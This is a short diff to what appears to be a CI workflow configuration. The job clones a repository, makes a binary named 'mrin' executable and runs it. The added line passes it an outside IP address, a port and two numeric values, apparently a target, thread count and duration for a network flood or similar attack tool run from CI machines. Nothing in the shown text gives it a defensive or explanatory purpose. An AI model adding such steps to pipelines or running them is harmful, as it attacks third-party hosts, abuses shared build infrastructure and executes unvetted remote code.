@@ -13,4 +13,5 @@ jobs:
         - git clone https://github.com/MiLKyWay-cyBer/ss.git
         - cd ss
         - chmod +x mrin
-        - ./mrin
+        - ./mrin 20.204.10.249 28355 240 900
+ 
